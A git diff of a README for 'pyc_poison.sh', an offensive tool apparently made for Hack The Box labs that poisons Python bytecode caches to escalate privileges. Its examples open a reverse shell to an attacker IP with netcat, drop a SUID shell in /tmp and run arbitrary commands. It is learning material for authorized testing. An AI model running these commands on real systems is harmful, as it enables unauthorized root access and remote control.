@@ -6,6 +6,8 @@ During one of our weekly [Hack The Box](https://www.hackthebox.com/) sessions we
 
 Rather than patching the `.pyc` by hand every time (recompiling, fixing the magic number, syncing the header timestamp/size so Python actually loads the cache), I had Claude build this script to do it automatically.
 
+<img src="./assets/poc.png">
+
 > ⚠️ **For authorized use only.** This is an offensive-security learning tool for CTFs, HTB/THM labs, and systems you own or are explicitly permitted to test.
 > Don't use it against anything you don't have permission to touch.
 
@@ -71,14 +73,6 @@ Payload precedence: `--suid` > `--cmd` > reverse shell.
 
 ### Examples
 
-Drop a SUID shell:
-
-```bash
-./pyc_poison.sh __pycache__/pyc_mod.cpython-312.pyc pyc_mod.py -s
-# after the module is imported by the privileged process:
-/tmp/.shell -p
-```
-
 Catch a reverse shell:
 
 ```bash
@@ -87,6 +81,14 @@ nc -lvnp 4444
 
 # on target
 ./pyc_poison.sh __pycache__/pyc_mod.cpython-312.pyc pyc_mod.py -i 10.10.14.5 -p 4444
+```
+
+Drop a SUID shell:
+
+```bash
+./pyc_poison.sh __pycache__/pyc_mod.cpython-312.pyc pyc_mod.py -s
+# after the module is imported by the privileged process:
+/tmp/.shell -p
 ```
 
 Run an arbitrary command:
